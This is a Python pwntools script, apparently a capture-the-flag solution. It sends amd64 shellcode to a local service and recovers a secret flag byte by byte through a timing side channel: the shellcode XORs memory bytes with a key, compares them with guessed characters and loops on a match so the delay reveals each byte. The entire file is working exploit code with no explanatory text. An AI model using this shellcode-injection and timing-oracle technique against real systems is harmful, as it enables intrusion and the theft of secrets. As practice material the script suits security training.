#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal
import string

table = string.printable

context.arch = 'amd64'
context.log_level = 'ERROR'
flag = ''

for i in range(0x28):
    for v in table:
        sh = remote('127.0.0.1', 1000)
        shellcode = asm('''
        mov rdi, 3
        mov al, 37
        syscall

        xor eax, eax
        mov al, [0xcafe000 + %d]
        xor ebx, ebx
        mov bl, [0xcafe028 + %d]

        xor al, bl
        sub rax, %d

        loop: 
        test rax, rax
        je loop

        mov al, 0
        syscall
        ''' % (i , i % 8, ord(v)))

        # open('./shell', 'wb').write(shellcode)

        sh.send(shellcode)

        old = time.time()
        try:
            sh.recv()
        except EOFError:
            pass

        sh.close()
        if(time.time() - old > 2):
            flag += v
            print(flag)
            break
